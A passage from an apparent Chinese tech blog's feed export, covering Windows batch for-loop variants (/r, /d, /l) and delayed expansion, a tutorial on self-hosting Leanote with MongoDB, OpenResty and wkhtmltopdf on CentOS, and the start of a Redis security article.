<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">set</span> num=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> ('<span class="built_in">dir</span> /a-d /b *.exe') <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">set</span> /a num+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">call</span> <span class="built_in">echo</span> num 当前的值是 <span class="variable">%%n</span>um%%</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> 当前目录下共有 <span class="variable">%num%</span> 个exe文件</span><br><span class="line"><span class="built_in">dir</span> /a-d /b *.txt|<span class="built_in">findstr</span> "test"&gt;<span class="built_in">nul</span>&amp;&amp;(</span><br><span class="line">    <span class="built_in">echo</span> 存在含有 test 字符串的文本本件</span><br><span class="line">)||<span class="built_in">echo</span> 不存在含有 test 字符串的文本文件</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">exist</span> test.ini (</span><br><span class="line">    <span class="built_in">echo</span> 存在 test.ini 文件</span><br><span class="line">) <span class="keyword">else</span> 不存在 test.ini 文件</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>由此可见，如果使用 setlocal enabledelayedexpansion 语句来延迟变量，就要把原本使用百分号对闭合的变量引用改为使用感叹号对来闭合；如果使用call语句，就要在原来命令的前部加上 call 命令，并把变量引用的单层百分号对改为双层。 其中，因为call语句使用的是双层百分号对，容易使人犯迷糊，所以用得较少，常用的是使用 setlocal enabledelayedexpansion 语句（set是设置的意思，local是本地的意思，enable是能够的意思，delayed是延迟的意思，expansion是扩展的意思，合起来， 就是：让变量成为局部变量，并延迟它的扩展行为）。</p>
<p>通过上面的分析，我们可以知道：</p>
<p>   1、为什么要使用变量延迟？因为要让复合语句内部的变量实时感知到变量值的变化。<br>　2、在哪些场合需要使用变量延迟语句？在复合语句内部，如果某个变量的值发生了改变，并且改变后的值需要在复合语句内部的其他地方被用到，那么，就需要使用变量延迟语句。而复合语句有：for语句、if……else语句、用连接符&amp;、||和&amp;&amp;连接的语句、用管道符号|连接的语句，以及用括号括起来的、由多条语句组合而成的语句块。最常见的场合，则是for语句和if……else语句。<br>　3、怎样使用变量延迟？<br>　　方法有两种：<br>　　① 使用 setlocal enabledelayedexpansion 语句：在获取变化的变量值语句之前使用setlocal enabledelayedexpansion，并把原本使用百分号对闭合的变量引用改为使用感叹号对来闭合；<br>　　② 使用 call 语句：在原来命令的前部加上 call 命令，并把变量引用的单层百分号对改为双层。</p>
<p>“变量延迟”是批处理中一个十分重要的机制，它因预处理机制而生，用于复合语句，特别是大量使用于强大的for语句中。只有熟练地使用这一机制，才能在for的世界中如鱼得水，让自己的批处理水平更上一层楼。很多时候，对for的处理机制，我们一直是雾里看花，即使偶有所得，也只是只可意会难以言传。希望大家反复揣摩，多加练习，很多细节上的经验，是只有通过大量的摸索才能得到的。</p>
<p>本节内容在原理上参考了这篇文章：什么情况下该使用变量延迟？<a href="http://www.cn-dos.net/forum/viewthread.php?tid=20733，在本论坛中的地址是：http://bbs.bathome.net/viewthread.php?tid=2899" target="_blank" rel="noopener">http://www.cn-dos.net/forum/viewthread.php?tid=20733，在本论坛中的地址是：http://bbs.bathome.net/viewthread.php?tid=2899</a></p>
<h2 id="翻箱倒柜遍历文件夹：for-r"><a href="#翻箱倒柜遍历文件夹：for-r" class="headerlink" title="翻箱倒柜遍历文件夹：for /r"></a><strong>翻箱倒柜遍历文件夹：for /r</strong></h2><h4 id="for-r-的作用及用法"><a href="#for-r-的作用及用法" class="headerlink" title="for /r 的作用及用法"></a><strong>for /r 的作用及用法</strong></h4><p>按照帮助信息里文绉绉的说法，for /r 的作用是“递归”，我们换一个通俗一点的，叫“遍历文件夹”。</p>
<p>更详细的解释就是：在下面的语句中，如果“元素集合”中只是一个点号，那么，这条语句的作用就是：列举“目录”及其之下的所有子目录，对这些文件夹都 执行“命令语句集合”中的命令语句。其作用与嵌套进 for /f 复合语句的 “dir /ad /b /s 路径” 功能类似。如果省略了“目录”，将在当前目录下执行前面描述的操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for /r 目录 %%i in (元素集合) do 命令语句集合</span><br></pre></td></tr></table></figure>

<p>先来个代码增强一下印象：<br>[code21]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /r d:\test <span class="variable">%%i</span> <span class="keyword">in</span> (.) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>执行的结果如下所示：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">d:\<span class="title">test</span>\.</span></span><br><span class="line"><span class="function"><span class="title">d</span>:\<span class="title">test</span>\1\.</span></span><br><span class="line"><span class="function"><span class="title">d</span>:\<span class="title">test</span>\2\.</span></span><br><span class="line"><span class="function"><span class="title">d</span>:\<span class="title">test</span>\3\.</span></span><br></pre></td></tr></table></figure>

<p>效果就是显示 d:\test 目录及其之下是所有子目录的路径，其效果与 dir /ad /b /s d:\test 类似。若要说到两者的区别，可以归纳出3点：<br>　1、for /r 列举出来的路径最后都带有斜杠和点号，而 dir 语句则没有，会对获取到的路径进行进一步加工产生影响；<br>　2、for /r 不能列举带隐藏属性的目录，而 dir 语句则可以通过指定 /a 后面紧跟的参数来获取带指定属性的目录，更加灵活；<br>　3、若要对获取到的路径进行进一步处理，则需要把 dir 语句放入 for /f 语句中进行分析，写成 for /f %%i in (‘dir /ad /b /s’) do …… 的形式；由于 for /r 语句是边列举路径边进行处理，所以，在处理大量路径的时候，前期不会感到有停顿，而 for /f 语句则需要等到 dir /ad /b /s 语句把所有路径都列举完之后，再读入内存进行处理，所以，在处理大量路径的时候，前期会感到有明显的停顿。</p>
<p>第2点差别很容易被大家忽视，导致用 for /r 列举路径的时候会造成遗漏；而第3点则会让大家有更直观的感受，很容易感觉到两者之间的差别。</p>
<p>要是“元素集合”不是点号呢？那又如何？</p>
<p>来看看这个代码：<br>[code22]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /r d:\test <span class="variable">%%i</span> <span class="keyword">in</span> (a b c) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>运行的结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">D:\test\1\a</span><br><span class="line">D:\test\1\b</span><br><span class="line">D:\test\1\c</span><br><span class="line">D:\test\2\a</span><br><span class="line">D:\test\2\b</span><br><span class="line">D:\test\2\c</span><br><span class="line">D:\test\3\a</span><br><span class="line">D:\test\3\b</span><br><span class="line">D:\test\3\c</span><br></pre></td></tr></table></figure>

<p>原来，它的含义是：列举 d:\test 及其所有的子目录，对所有的目录路径都分别添加a、b、c之后再显示出来。</p>
<p>再来看一个代码：<br>[code23]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /r d:\test <span class="variable">%%i</span> <span class="keyword">in</span> (*.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>运行结果是：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">test</span>\<span class="title">test.txt</span></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">test</span>\1\1.<span class="title">txt</span></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">test</span>\1\2.<span class="title">txt</span></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">test</span>\2\<span class="title">a.txt</span></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">test</span>\2\<span class="title">b.txt</span></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">test</span>\3\1.<span class="title">txt</span></span></span><br></pre></td></tr></table></figure>

<p>这段代码的含义是：列举 d:\test 及其所有子目录下的txt文本文件（以.txt结尾的文件夹不会被列出来）。</p>
<p>我们再回过头来归纳一下这个语句的作用：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /r 目录 <span class="variable">%%i</span> <span class="keyword">in</span> (元素集合) <span class="keyword">do</span> 命令语句集合</span><br></pre></td></tr></table></figure>

<p>上面语句的作用是：</p>
<p>  1、列举“目录”及该目录路径下所有子目录，并把列举出来的目录路径和元素集合中的每一个元素拼接成形如“目录路径\元素”格式的新字符串，然后，对每一条这样的新字符串执行“命令语句集合”中的每一条命令；<br>　　特别的是：当“元素集合”带以点号分隔的通配符?或*的时候，把“元素集合”视为文件（不视为文件夹），整条语句的作用是匹配“目录”所指文件夹及其所有子文件夹下匹配的文件；若不以点号分隔，则把“元素集合”视为文件夹（不视为文件）；<br>　2、当省略掉“目录”时，则针对当前目录；<br>　3、当元素集合中仅仅是一个点号的时候，将只列举目录路径；</p>
<h4 id="for-r-还是-dir-ad-b-s？列举目录时该如何选择"><a href="#for-r-还是-dir-ad-b-s？列举目录时该如何选择" class="headerlink" title="for /r 还是 dir /ad /b /s？列举目录时该如何选择"></a><strong>for /r 还是 dir /ad /b /s？列举目录时该如何选择</strong></h4><p>前面已经说过，当列举目录时，for /r 和 dir /ad /b /s 的效果是非常类似的，这就产生了一个问题：当我要获取目录路径并进行进一步处理的时候，两者之间，我该如何选择？</p>
<p>这个问题，前面其实已经有过一些讨论，现在我们再来作详细的分析。</p>
<p>我们来看一下两者各自的优缺点：</p>
<p>1、for /r：</p>
<p>  1）优点：</p>
<p>​    ① 只通过1条语句就可以同时实现获取目录路径和处理目录路径的操作；<br>　 ② 遍历文件夹的时候，是边列举边处理的，获取到一条路径就处理一条路径，内存占用小，处理大量路径的时候不会产生停顿感；</p>
<p>  2）缺点：</p>
<p>​    ① 不能获取到带隐藏属性的目录，会产生遗漏；<br>　 ② 不能获取带指定属性的目录</p>
<p>2、dir /ad /s：</p>
<p>  1）优点：</p>
<p>​    ① 能一次性获取带任意属性的目录，不会产生遗漏；<br>　 ② 能通过指定不同的参数获取带任意属性的目录，更具灵活性。</p>
<p>  2）缺点：</p>
<p>​    ① dir /ad /s 语句仅能获取到目录路径，若要实现进一步的处理，还需要嵌入 for /f 语句中才能实现，写法不够简洁；<br>　 ② 嵌入 for /f 语句之后，需要写成 for /f “delims=” %%i in (‘dir /ad /b /s’) do …… 的格式，受 for /f 语句运行机制的制约，需要先列举完所有的路径放入内存之后，才能对每一条路径进行进一步的处理，处理大量路径时，内存占用量偏大，并且在前期会产生明显的 停顿感，用户体验度不够好；</p>
<p>综合上述分析，可以做出如下选择：<br>    1、若仅仅是为了获取某文件夹及其所有子文件夹的路径的话，请选择 dir /ad /b /s 语句；<br>　 2、若需要过滤带隐藏属性的文件夹的话，for /r 和 dir 语句都可以实现，但 for /r 内存占用小，处理速度快，是上上之选；<br>　 3、若需要获取所有文件夹，则除了 dir /ad /b /s 外，别无选择，因为 for /r 语句会遗漏带隐藏属性的文件夹；</p>
<p>在实际的使用中，我更喜欢使用 for /f 和 dir 的组合，因为它不会产生遗漏，并能给我带来更灵活的处理方式，唯一需要忍受的，就是它在处理大量路径时前期的停顿感，以及在这背后稍微有点偏高的内存占 用；在我追求速度且可以忽略带隐藏属性的目录的时候，我会换用 for /r 的方案，不过这样的情形不多——有谁会愿意为了追求速度而容忍遗漏呢？</p>
<h2 id="仅仅为了匹配第一层目录而存在：for-d"><a href="#仅仅为了匹配第一层目录而存在：for-d" class="headerlink" title="仅仅为了匹配第一层目录而存在：for /d"></a><strong>仅仅为了匹配第一层目录而存在：for /d</strong></h2><p>for /d 中 /d ，完整的含义是 /directory，本意是为了处理文件夹，它的完整语句应该是这样的：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /d <span class="variable">%%i</span> <span class="keyword">in</span> (元素集合) <span class="keyword">do</span> 命令语句集合</span><br></pre></td></tr></table></figure>

<p>当“元素集合”中包含有通配符?或*时，它会匹配文件夹，但是，相比 for /r 而言，这个时候的for /d，其作用就小得可怜了：它仅能匹配当前目录下的第一级文件夹，或是指定位置上的文件夹，而不能匹配更深层次的子文件夹。</p>
<p>例如：for /d %%i in (d:\test*) do echo %%i 这样的语句 ，会匹配到形如：d:\test、d:\test1、d:\test2之类的文件夹，若不存在这样的路径，将不会有任何回显。</p>
<p>当“元素集合”中不包含任何的通配符时，它的作用和 “for %%i in (元素集合) do 命令语句集合” 这样的语句别无二致。</p>
<p>因此，for /d 的角色就变得很微妙了：当“元素集合”中包含通配符?或*时，它的作用就是匹配文件夹，此时，它仅能匹配当前目录下的第一级文件夹，或是指定位置上的文件夹，在层次深度上不及 for /r，但和 for /r 一样的坏脾气：不能匹配带隐藏属性的文件夹；在灵活性上不及for /f和dir的组合；当“元素集合”中不包含任何统配符的时候，它完全是 “for %%i in (元素集合) do ……” 语句的翻版，但是又稍显复杂。</p>
<p>for /d 的作用是如此有限，我使用的次数是如此之少，以至于我一度找不到它的用武之地，认为它食之无味，弃之可惜，完全是鸡肋一块。</p>
<p>某年某月，我在cmd窗口里写下了这样的代码：<br>[code24]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /d %i <span class="keyword">in</span> (test*) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure>

<p>我的本意是想查看在我的临时目录下，长年累月的测试工作到底建立了多少测试文件夹，以便我随后把echo换成rd删除之。这个时候，我发现这条代码是如此 的简洁，是 for /r 或 for和 dir /ad /b 的组合所无法替代的（echo换成rd就可以直接删除掉这些测试目录）。</p>
<p>简洁的代码给我带来的喜悦仅仅持续了短短10几秒的时间，我便开始了迷惘——能用到for /d的类似情形，貌似少之又少且乏善可陈啊。</p>
<p>（注：正如qzwqzw所言，for /r /d是可以一起使用的；【在for有限的4个参数中，据我所知只有/r /d可以一起使用】。<br>例如：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">For</span> /r /d <span class="variable">%%i</span> <span class="keyword">in</span> (*) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">pause</span>&gt;<span class="built_in">nul</span></span><br></pre></td></tr></table></figure>

<p>效果：<br>显示当前目录下所有的文件夹【包括子文件夹】；等价于 “dir /ad /s /b”。</p>
<p>for /r /d 其实是对 /d 参数的扩展，/d参数本身只能处理第一层文件夹，但是加上/r参数后就可以处理所有的子文件夹；</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /r /d依然不能处理隐藏文件夹。</span><br><span class="line">这里给出使用<span class="keyword">for</span> /r /d的一般条件：</span><br><span class="line"><span class="number">1</span>.要对文件夹进行操作（<span class="built_in">dir</span> /ad /s /b可以显示，但不能对文件夹进行操作）；</span><br><span class="line"><span class="number">2</span>.不处理隐藏文件夹（说到底，还是<span class="keyword">for</span> /f 和<span class="built_in">dir</span>结合的命令更强大些）。</span><br></pre></td></tr></table></figure>



<h2 id="计数循环：for-l"><a href="#计数循环：for-l" class="headerlink" title="计数循环：for /l"></a><strong>计数循环：for /l</strong></h2><p>/l 者，/loop的缩写是也，从鸟语翻译过来，loop就是循环的意思。实际上，所有的for语句，都可以看成是一种“循环”，只是在/l中，特指按照指定次数进行循环罢了。</p>
<p>for /l 语句的完整格式是这样的：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /l <span class="variable">%%i</span> <span class="keyword">in</span> (x,y,z) <span class="keyword">do</span> (……)</span><br></pre></td></tr></table></figure>

<p>在这个语句中，x、y和z都只能取整数，正负皆可，x指代起始值，y指代步长，z为终止值，具体含义为：从x开始计数，以y为步长，直至最接近 z的那个整数值为止，这之间有多少个数，do后的语句就执行多少次。</p>
<p>举个具体的例子：<br>[code25]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /l <span class="variable">%%i</span> <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">10</span>) <span class="keyword">do</span> <span class="built_in">echo</span> bathome</span><br></pre></td></tr></table></figure>

<p>在以上的代码中，初始值是1，步长为2，终止值为10，表明计数从1开始，每隔2个数计算一次，直至最接近10的那个整数，罗列出来，就是1,3,5,7,9，再下一个就是11，超过10了，不再计算在内，所以，do后的语句只执行5次，将连续显示5个bathome。</p>
<p>实际上，x，y和z的值可正可负，甚至为0，限制非常宽松：<br> 1、步长y的值不能为0；<br> 2、当步长y的值为正整数时，终止值z不能小于初始值x；<br> 3、当步长y的值为负整数的时候，终止值z不能大于初始值x。</p>
<p>换而言之，必须保证in和do之间能取到一个有效的数组序列。</p>
<p>例如：<br>[code26]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /l <span class="variable">%%i</span> <span class="keyword">in</span> (-<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>) <span class="keyword">do</span> <span class="built_in">echo</span> bathome</span><br></pre></td></tr></table></figure>

<p>[code27]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /l <span class="variable">%%i</span> <span class="keyword">in</span> (<span class="number">5</span>,-<span class="number">2</span>,-<span class="number">1</span>) <span class="keyword">do</span> <span class="built_in">echo</span> bathome</span><br></pre></td></tr></table></figure>

<p>以上两条代码的功能完全一样，都将显示4次bathome，区别就在于[code26]是正序计算，而[code27]是逆序计数而已。</p>
<p>以下几条代码都是有问题的：<br>[code28]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /l <span class="variable">%%i</span> <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>) <span class="keyword">do</span> <span class="built_in">echo</span> bathome</span><br></pre></td></tr></table></figure>

<p>[code29]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /l <span class="variable">%%i</span> <span class="keyword">in</span> (<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">do</span> <span class="built_in">echo</span> bathome</span><br></pre></td></tr></table></figure>

<p>[code30]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /l <span class="variable">%%i</span> <span class="keyword">in</span> (<span class="number">1</span>,-<span class="number">1</span>,<span class="number">2</span>) <span class="keyword">do</span> <span class="built_in">echo</span> bathome</span><br></pre></td></tr></table></figure>

<p>其中，[code28]违反了步长不能为0的限制，将陷入无限循环中；[code29]和[code30]都犯了同样的错误：无法获得有效的数列元素，导致in和do之间取到的值为空元素，从而使得整条for语句无从执行。</p>
<p>当大家明白了 for /l 的具体功能之后，是否会想到了与它有异曲同工之妙的goto循环语句呢？似乎，for /l 和 goto 循环语句可以相互替换？</p>
<p>一般而言，for /l语句可以换成goto循环，但是，goto循环并不一定能被 for /l 语句替换掉。具体原因，请大家仔细想想，我在此不再详细解说，只是就大家非常关心的一个问题提供一个简洁的答案，那就是：什么时候该用 for /l 计数循环，而什么时候又该用goto条件循环？</p>
<p>答案非常简单：当循环次数确定的时候，首选 for /l 语句，也可使用goto语句但不推荐；当循环次数不确定的时候，用goto语句将是唯一的选择，因为，这个时候需要用if之类的条件语句来判断何时结束goto跳转。</p>
]]></content>
      <categories>
        <category>编程积累</category>
        <category>批处理</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>开源云笔记:程序员云笔记服务的不二之选</title>
    <url>/articles/fbd5898c.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>在这个互联网知识呈爆炸增长的时代，作为一个程序员要掌握的知识越来越多，然再好的记性也不如烂笔头，有了笔记我们就是可以时常扒拉扒拉以前的知识，顺便可以整理下自己的知识体系。</p>
<p>如今市面上云笔记产品，说实在真不少，什么有道，印象，为知等等，本人目前使用的是有道，无它，免费而已其他几个倒没怎么接触过，毕竟重复的产品一个就够了。笔记用了有三年多时间了，基本都是写写工作日志，备忘一下工作中遇到的脚本命令，顺便记录下工作中遇到的问题，由于只是记录文字，目前10G的空间仅仅使用了冰山一角。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>今天，给大家一起分享的是蚂蚁笔记，一个有极客范的云笔记！官方的介绍也相当牛逼：前所未有的文档体验，近乎完美的平台覆盖，支持团队协同，企业级私有云，蚂蚁笔记 = 笔记 + 博客 + 协作 + 私有云。</p>
<p><img src="/articles/fbd5898c/8.png" alt="img"></p>
<p>其实最主要的是蚂蚁笔记开源了，既然如此，云服务器又那么便宜，我们何不自己搭建一个云笔记服务，无论是自己还是分享给同事都是极好的，最主要的是还可以绑定域名生成博客，笔记AND博客一举两得岂不乐哉。</p>
<p>当然，如果有些小伙伴对信息安全要求较高的，不希望自己的信息记录在别人的服务器上，对开源源码有一定研究，使用起来还是不错的。但是如果单纯是为了省钱就没必要了，即使收费的有道一天也就几毛钱而已，而云服务器费用，自身是否有技术支持也是以后使用的硬伤，下面开始如何安装使用教程。</p>
<a id="more"></a>



<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>提前预警，本次安装涉及到阿里云ECS、Centos7、Mongodb，Leanote、Golang、OpenResty、wkhtmltopdf、企业邮箱相关软件的安装配置。</p>
<h3 id="mongodb"><a href="#mongodb" class="headerlink" title="mongodb"></a>mongodb</h3><p>蚂蚁笔记数据库采用的是mongodb，需提前安装。</p>
<p>Yum源一键安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install mongodb-server  mongodb</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mongo</span><br></pre></td></tr></table></figure>

<p>由于ECS安全组并没有开放mongodb相关端口，仅内网使用，这里就没有配置相关鉴权访问。</p>
<h3 id="leanote"><a href="#leanote" class="headerlink" title="leanote"></a>leanote</h3><p>安装 Leanote 有两种方式：二进制版是编译好的 Leanote， 不用安装开发环境，Leanote 源码安装, 需要安装编译环境 Golang，为了方便期间，这里我们选择二进制版安装。</p>
<p>各版本下载地址：<a href="http://leanote.org/#download" target="_blank" rel="noopener">http://leanote.org/#download</a></p>
<p>选择Linux下64位最新版本下载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://superb-sea2.dl.sourceforge.net/project/leanote-bin/2.5/leanote-linux-amd64-v2.5.bin.tar.gz</span><br></pre></td></tr></table></figure>

<p>解压</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xvf leanote-linux-amd64-v2.5.bin.tar.gz</span><br></pre></td></tr></table></figure>

<p>导入数据库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd leanote</span><br><span class="line">mongorestore -h localhost -d leanote --dir mongodb_backup/leanote_install_data/</span><br></pre></td></tr></table></figure>

<h3 id="OpenResty"><a href="#OpenResty" class="headerlink" title="OpenResty"></a>OpenResty</h3><p>升级版Nginx，推荐大家使用，此处的目的是绑定域名，转发leanote服务。</p>
<p>Yum安装相关依赖组件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install readline-devel pcre-devel openssl-devel -y</span><br></pre></td></tr></table></figure>

<p>下载最新版本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://openresty.org/download/openresty-1.11.2.4.tar.gz</span><br></pre></td></tr></table></figure>

<p>解压并重命名：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xvf openresty-1.11.2.4.tar.gz</span><br><span class="line">mv openresty-1.11.2.4 openresty</span><br></pre></td></tr></table></figure>

<p>安装配置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure</span><br></pre></td></tr></table></figure>

<p>您可以使用下面的命令来编译安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>如果您的电脑支持多核 make 工作的特性, 您可以这样编译安装:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make &amp;&amp; make install   -j2</span><br></pre></td></tr></table></figure>

<p>为了方便启动，建立软连接：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /usr/local/openresty/nginx/sbin/nginx /usr/sbin/nginx</span><br></pre></td></tr></table></figure>

<p>配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /usr/local/openresty/nginx/conf/nginx.conf</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  notes.52itstyle.com;</span><br><span class="line">        charset utf-8;</span><br><span class="line">        location / &#123;</span><br><span class="line">            default_type text/html;</span><br><span class="line">            proxy_pass http://127.0.0.1:9000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="wkhtmltopdf"><a href="#wkhtmltopdf" class="headerlink" title="wkhtmltopdf"></a>wkhtmltopdf</h3><p>wkhtmltopdf主要用于导出PDF版笔记。</p>
<p>各版本下载地址：<a href="https://wkhtmltopdf.org/downloads.html" target="_blank" rel="noopener">https://wkhtmltopdf.org/downloads.html</a></p>
<p>下载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/wkhtmltopdf/wkhtmltopdf/releases/download/0.12.4/wkhtmltox-0.12.4_linux-generic-amd64.tar.xz</span><br></pre></td></tr></table></figure>

<p>解压</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xvf wkhtmltox-0.12.4_linux-generic-amd64.tar.xz</span><br></pre></td></tr></table></figure>

<p>移动文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd wkhtmltopdf/bin</span><br><span class="line">chmod +x wkhtmltopdf</span><br><span class="line">mv wkhtmltopdf /usr/local/bin</span><br></pre></td></tr></table></figure>

<p>测试是否安装成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/local/bin</span><br><span class="line">wkhtmltopdf http://notes.52itstyle.com /home/52itstyle.pdf</span><br></pre></td></tr></table></figure>

<p>导出的PDF中文会乱码，我们需要找到windows里C:\Windows\Fonts文件夹中的宋体或者微软雅黑字体，上传到服务器/usr/share/fonts/目录下即可。</p>
<h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><h3 id="启动-Leanote"><a href="#启动-Leanote" class="headerlink" title="启动 Leanote"></a>启动 Leanote</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd leanote/bin</span><br><span class="line">chmod +x run.sh</span><br><span class="line">./run.sh &amp;</span><br></pre></td></tr></table></figure>

<p>如果最后出现 Listening on :9000 … 说明启动成功</p>
<h3 id="启动-Nginx"><a href="#启动-Nginx" class="headerlink" title="启动 Nginx"></a>启动 Nginx</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nginx</span><br></pre></td></tr></table></figure>

<p>访问服务：<a href="http://notes.52itstyle.com/" target="_blank" rel="noopener">http://notes.52itstyle.com/</a> ，出现以下界面，说明配置成功。</p>
<p><img src="/articles/fbd5898c/1.png" alt="img"></p>
<h2 id="使用配置"><a href="#使用配置" class="headerlink" title="使用配置"></a>使用配置</h2><p>Leanote默认账号为amdin，密码是abc123。登陆成功后首先进入后台管理，配置Site’s URL为自己的域名</p>
<p><img src="/articles/fbd5898c/2.png" alt="img"></p>
<p>同时修改leanote/conf/app.conf相关参数site.url 为<a href="http://notes.52itstyle.com，" target="_blank" rel="noopener">http://notes.52itstyle.com，</a> 不然每次重启要重新界面设置。</p>
<p>配置电子邮件发送，用于登录、注册、留言、找回密码、邀请注册等操作</p>
<p><img src="/articles/fbd5898c/3.png" alt="img"></p>
<p>配置wkhtmltopdf执行命令路径</p>
<p><img src="/articles/fbd5898c/4.png" alt="img"></p>
<p>进入个人中心，配置密码以及博客设置</p>
<p><img src="/articles/fbd5898c/5.png" alt="img"></p>
<p>笔记相关界面操作</p>
<p><img src="/articles/fbd5898c/6.png" alt="img"></p>
<h2 id="APP访问"><a href="#APP访问" class="headerlink" title="APP访问"></a>APP访问</h2><p>Leanote的客户端做的也是相当贴心和完善了, 在登录界面最底部点击使用自定义服务器。</p>
<p><img src="/articles/fbd5898c/7.png" alt="img"></p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Cloud</tag>
      </tags>
  </entry>
  <entry>
    <title>redis安全机制设置</title>
    <url>/articles/3f430996.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>redis作为一个高速数据库，在互联网上广泛使用，但是在生产环境必须有对应的安全机制来进行保护。那么怎么保护呢？</p>
<a id="more"></a>



<h4 id="方法一：采用绑定IP的方式来进行控制。"><a href="#方法一：采用绑定IP的方式来进行控制。" class="headerlink" title="方法一：采用绑定IP的方式来进行控制。"></a><strong>方法一：采用绑定IP的方式来进行控制</strong>。</h4><p> 请在redis.conf文件找到如下配置</p>
